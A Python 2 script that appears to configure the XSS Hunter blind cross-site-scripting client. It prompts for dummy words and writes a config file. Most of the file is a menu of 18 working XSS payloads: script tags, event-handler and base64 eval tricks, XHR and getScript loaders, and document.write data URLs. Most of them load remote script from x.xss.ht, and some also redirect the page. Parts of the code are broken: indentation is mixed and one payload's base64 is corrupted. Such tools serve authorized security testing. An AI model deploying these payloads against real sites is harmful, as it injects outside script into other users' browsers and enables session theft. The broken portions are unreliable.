#!/usr/bin/env python
import yaml
import os

def get_payload_id_from_number( number ):
    if number == 1:
        return "generic_script_tag_payload"
    elif number == 2:
        return "javascript_uri_payload"
    elif number == 3:
        return "input_tag_payload"
    elif number == 4:
        return "image_tag_payload"
    elif number == 5:
        return "source_tag_payload"
    elif number == 6:
        return "srcdoc_tag_payload"
    elif number == 7:
        return "xhr_payload"
    elif number == 8:
        return "getscript_payload"
    elif number == 9:
	return "getscript_from_js_payload"
    elif number == 10:
	return "js_akamai_bypass_payload"
    elif number == 11:
	return "js_akamai_apos_payload"
    elif number == 12:
	return "data_url_payload"
    elif number == 13:
	return "js_uri_write_payload"
    elif number == 14:
	return "js_write_payload"
    elif number == 15:
	return "js_write_apos_payload"
    elif number == 16:
	return "img_write_payload"
    elif number == 17:
	return "svg_payload"
    elif number == 18:
	return "textarea_payload"
    else:
        return 1

print( """
Welcome to the XSS Hunter client config generation tool!

** How Does It Work? **
The XSS Hunter clients works by replacing pre-specified "dummy words" with XSS correlation payloads.

Each payload is generated with a unique ID like the following:
https://x.xss.ht/ljsdhu6f84

Upon the above "tagged" payload firing, the full HTTP request that caused the injection will also be included in the report.
This allows for much better reporting since you have the full details to reproduce the vulnerability.

==================
""" )

keep_going = True
settings = {}
settings["xss_probe_settings"] = {}
while keep_going:
    dummy_word = raw_input( "Dummy word: " )
    print(
    """
Please choose the payload type you'd like to use for this dummy word:
1) "><script src=https://x.xss.ht></script>
2) javascript:eval('var a=document.createElement(\'script\');a.src=\'https://x.xss.ht\';document.body.appendChild(a)')
3) "><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
4) "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
5) "><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
6) "><iframe srcdoc="&#60;&#115;&#99;..">
7) <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//x.xss.ht");a.send();</script>
8) <script>$.getScript("//x.xss.ht")</script>
9) ";jQuery.getScript("//x.xss.ht");//
10) ";var a=document.createElement("script");a.setAttribute("src","//x.xss.ht");document.head.appendChild(a);//
11) ';var a=document.createElement('script');a.setAttribute('src','//x.xss.ht');document.head.appendChild(a);//
12) data:a;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8veC54c3MuaHQiPjwvc2NyaXB0PjxzY3JpcHQ+c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbiA9ICJodHRwczovL3d3dy55YWhvby5jb20ifSwgNDAwMCk7PC9zY3JpcHQ+ZGF0YUxpbms=
13) javascript:document.write(atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8veC54c3MuaHQiPjwvc2NyaXB0PjxzY3JpcHQ+c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbiA9ICJodHRwczovL3d3dy55YWhvby5jb20ifSwgNDAwMCk7PC9zY3JpcHQ+ZGF0YUxpbms='));
14) ";document.write(atob("PHNjcmlwdCBzcmM9Imh0dHBzOi8veC54c3MuaHQiPjwvc2NyaXB0PjxzY3JpcHQ+c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbiA9ICJodHRwczovL3d3dy55YWhvby5jb20ifSwgNDAwMCk7PC9zY3JpcHQZGF0YUxpbms="));//
15) ';document.write(atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8veC54c3MuaHQiPjwvc2NyaXB0PjxzY3JpcHQ+c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbiA9ICJodHRwczovL3d3dy55YWhvby5jb20ifSwgNDAwMCk7PC9zY3JpcHQ+ZGF0YUxpbms='));//
16) '>"></textarea></script><img id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 src=x onerror=eval(atob(this.id))>
17) '>"><svg/onload=document.write(atob(this.id)) id=PHNjcmlwdD5jb25maXJtKDEpOzwvc2NyaXB0PmFz>
18) '>"></textarea></script><script src=//x.xss.ht></script>

    """
    )
    payload_number = raw_input( "Payload #: ")
    settings["xss_probe_settings"][ dummy_word ] = get_payload_id_from_number( int( payload_number ) )
    keep_going_word = raw_input( "Add another rule? (y/n): ")
    keep_going = ( keep_going_word.lower() == "y" or keep_going_word.lower() == "yes" )

domain = raw_input( "What is your XSS Hunter domain? (eg: x.xss.ht): " )
settings["domain"] = domain
owner_correlation_key = raw_input( "Your XSS Hunter injection correlation key?: (found under settings menu): " )
settings["owner_correlation_key"] = owner_correlation_key

with open( "config.yaml", "w" ) as yaml_handler:
    yaml_handler.write( yaml.dump( settings ) )

print( "Settings file saved successfully!" )
